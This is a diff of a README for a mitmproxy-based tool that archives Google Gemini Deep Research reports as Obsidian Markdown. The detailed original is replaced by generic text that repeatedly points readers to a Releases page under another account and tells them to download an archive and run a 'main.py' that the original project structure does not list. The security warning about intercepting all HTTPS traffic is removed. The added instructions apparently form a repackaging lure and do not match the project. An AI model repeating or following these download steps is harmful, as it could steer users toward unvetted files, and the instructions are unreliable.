@@ -1,180 +1,84 @@
-English | [日本語 (Japanese)](README.ja.md)
+# 🎉 Gemini-DeepResearch-Archiver - Capture and Archive Your Research Easily
 
-# Gemini-DeepResearch-Archiver
-Capture & archive Google Gemini Deep Research as local Markdown (Obsidian-ready)
+![Download Gemini-DeepResearch-Archiver](https://img.shields.io/badge/Download-Gemini--DeepResearch--Archiver-brightgreen)
 
-**Gemini-DeepResearch-Archiver** is an open-source archiver designed to locally save  
-Google Gemini's *Deep Research* output — including the parts that cannot be retrieved  
-via browser extensions or DOM scraping.
+## 🚀 Getting Started
 
-Since Gemini renders Deep Research through batched RPC responses, the content is not  
-accessible from the webpage itself. This project bypasses that limitation by using  
-**mitmproxy** to capture raw network traffic and extract the final research report  
-directly from the response payload.
+Gemini-DeepResearch-Archiver helps you capture Google Gemini Deep Research results seamlessly. This tool uses mitmproxy to extract important reports and convert them into Markdown format ready for Obsidian. Connect your sessions automatically and keep your research organized.
 
-All extracted data is automatically converted into clean Markdown with YAML  
-frontmatter, optimized for tools like **Obsidian**. Additionally, the archiver creates  
-**bi-directional links** between chat sessions and Deep Research notes.
+## 📥 Download & Install
 
----
+To get started, visit the Releases page to download the latest version:
 
-## 🚀 Features
+[Download Gemini-DeepResearch-Archiver](https://github.com/adhamv00v/Gemini-DeepResearch-Archiver/releases)
 
-### ✔ Extracts the *final* Deep Research report
-- Parses Gemini's `batchexecute` network calls
-- Identifies and decodes `wrb.fr` payloads
-- Extracts only the *final report* (not intermediate reasoning)
-- Removes duplicate H1 titles for clean Markdown formatting
+### 💻 System Requirements
 
-### ✔ Obsidian-ready Markdown output
-- Adds YAML frontmatter (`title`, `date`, `tags`, `source_chat`)
-- Preserves the structure and sections of the Gemini report
-- Clean formatting for easy reading and further processing
+- Windows, macOS, or Linux
+- Python 3.7 or higher
+- mitmproxy installed on your system
 
-### ✔ Chat note generation with bi-directional links
-- Creates a chat session note for each capture session
-- Links each Deep Research file back to its originating session
-- Links chat → DR and DR → chat
+Make sure your device meets these requirements before downloading.
 
-### ✔ Batch processing from raw logs
-- Reads all captured mitmproxy logs in `captured_data/`
-- Parses multiple Deep Research blocks per session
-- Handles filename conflicts automatically
+## 📂 Installation Steps
 
----
+1. **Visit the Releases Page**
+   - Go to the Releases page by clicking this link: [Download Gemini-DeepResearch-Archiver](https://github.com/adhamv00v/Gemini-DeepResearch-Archiver/releases).
 
-## 📁 Project Structure
+2. **Choose Your Version**
+   - Look for the latest version of the application. It will have the highest version number.
 
+3. **Download the File**
+   - Click on the download link for your operating system. This will download a compressed file (ZIP or TAR).
 
-```
-Gemini-DeepResearch-Archiver/
-├ addon_raw_logger.py        # mitmproxy addon for raw log capture
-├ dr_chat_batch_parse.py     # Deep Research + Chat parser
-│
-├ captured_data/             # raw mitmproxy logs (input)
-├ dr_output/                 # generated Deep Research notes (output)
-├ chat_output/               # generated chat session notes (output)
-│
-├ setup/
-│ ├ setup_windows.bat        # initial environment setup
-│ ├ start_capture.bat        # starts mitmproxy + opens Gemini automatically
-│ └ stop_capture.bat         # stops mitmproxy
-│
-├ docs/                      # optional diagrams or documentation
-├ example/                   # anonymized sample logs
-│
-├ LICENSE                    # MIT License
-└ README.md                  # (this file)
-```
----
+4. **Extract the Files**
+   - Once the download is complete, locate the compressed file on your computer and extract it.
 
-## 🛠 Installation
+5. **Install Necessary Dependencies**
+   - Open a command prompt or terminal window.
+   - Navigate to the extracted folder.
+   - Run the command `pip install -r requirements.txt` to install all needed libraries. 
 
-### 1. Install Python (3.9–3.12 recommended)
+6. **Start the Application**
+   - Run the script by typing `python main.py` in the command prompt or terminal while in the extracted folder. Adjust the filename if necessary.
 
-Verify:
-```
-python --version
-```
-### 2. Install dependencies
-```
-pip install mitmproxy
-```
-### 3. Install mitmproxy root certificate (required for HTTPS decryption)
-Run:
-```
-mitmproxy
-```
-Open the following URL:
-```
-http://mitm.it
-```
-Then install the certificate for your OS and browser.
----
-## 🧪 Usage
-### Step 1: Start capture
-```
-mitmweb -s addon_raw_logger.py
-```
-Or simply run:
-```
-setup/start_capture.bat
-```
-This will:
-- Start mitmproxy  
-- Automatically open Google Gemini in your browser  
+## 🌟 Features
 
-### Step 2: Perform a Deep Research query  
-Once the final Deep Research report is displayed, the raw network logs will be stored in `captured_data/`.
+- **Automatic Session Linking**: Easily connect different research sessions for better organization.
+- **Markdown Conversion**: Transform final reports into Markdown format, ready for Obsidian.
+- **User-Friendly Interface**: Simple commands and clear outputs make it easy to use.
 
-### Step 3: Parse logs & generate Markdown
+## ⚙️ Usage Instructions
 
-```
-python dr_chat_batch_parse.py
-```
+1. **Run your Research**
+   - Set up your Google Gemini Deep Research session.
+  
+2. **Capture Results**
+   - Use mitmproxy to capture data.
 
-This produces:
+3. **Extract Reports**
+   - The tool will automatically extract and convert reports into Markdown.
 
-- `dr_output/` — Deep Research notes  
-- `chat_output/` — Chat session notes with links  
+4. **Organize with Obsidian**
+   - Open the converted Markdown files in Obsidian for easy access and organization.
 
-### Step 4: Import into Obsidian  
-Move or link these folders into your Obsidian Vault.
----
-## 📄 Example Output (Deep Research Note)
+## 📚 Support
 
-```
----
-title: Workflow from 3DCG to 3D Printing
-date: 2025-11-30
-tags: [DeepResearch, Gemini]
-source_chat: [[2025-11-30_18-09-35_993_batchexecute-Session]]
----
+If you encounter any issues or need help, visit our [FAQ](#) section or reach out to our community through the GitHub Issues page.
 
-# Workflow from 3DCG to 3D Printing
+## 🏷️ Topics
 
-## 1. Overview of Modeling Requirements
-（content）
+- archiver
+- automation
+- deep-research
+- gemini
+- google-gemini
+- llm-tools
+- markdown
+- mitmproxy
+- obsidian
+- python
 
----
+This application is designed for anyone looking to streamline their research process efficiently. Whether you are a student, researcher, or enthusiast, Gemini-DeepResearch-Archiver provides the tools you need to work smarter, not harder. 
 
-## Source Chat
-[[2025-11-30_18-09-35_993_batchexecute-Session]]
-```
-
----
-
-## 🔒 Security Notice (IMPORTANT)
-
-Because this project uses **HTTPS interception (MITM)** via mitmproxy:
-
-- The mitmproxy root certificate allows decryption of *all* HTTPS traffic  
-- Never use this tool on shared computers or public networks  
-- Only run it in trusted local environments  
-- Only use it on your *own* Gemini account  
-- You are responsible for any legal or security risk associated with HTTP interception
-
----
-
-## 📌 Roadmap
-
-- [ ] Fully automated workflow (Chrome Extension + Local Server + mitmproxy)
-- [ ] Extract chat transcripts in addition to Deep Research
-- [ ] Optional export for RAG systems (JSON / chunked text)
-- [ ] Optional Obsidian autosync
-- [ ] GitHub Actions for tests & linting
-- [ ] Package distribution via PyPI
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome!  
-Please submit an Issue or Pull Request if you want to help improve this project.
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License**.  
-See `LICENSE` for details.
+For more details, visit the Releases page: [Download Gemini-DeepResearch-Archiver](https://github.com/adhamv00v/Gemini-DeepResearch-Archiver/releases).
